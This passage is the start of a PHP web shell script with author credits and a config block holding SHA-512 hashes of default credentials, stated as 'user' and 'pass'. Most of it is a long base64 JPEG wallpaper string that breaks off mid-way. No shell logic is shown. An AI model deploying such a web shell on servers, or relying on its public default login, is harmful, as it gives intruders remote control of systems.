<?php

//
// Author: Dr34dedPr0c355 / ebenner / eb3095
// Github: https://github.com/eb3095/php-shell
// Scrollbar By: https://codepen.io/zkreations
//

//
// Config
// Username and password are in sha512
// Default
//   username: user
//   password: pass
//

$USERNAME = "b14361404c078ffd549c03db443c3fede2f3e534d73f78f77301ed97d4a436a9fd9db05ee8b325c0ad36438b43fec8510c204fc1c1edb21d0941c00e9e2c1ce2";
$PASSWORD = "5b722b307fce6c944905d132691d5e4a2214b7fe92b738920eb3fce3a90420a19511c3010a0e7712b054daef5b57bad59ecbd93b3280f210578f547f4aed4d25";
$WALLPAPER = "data:image/jpeg;base64,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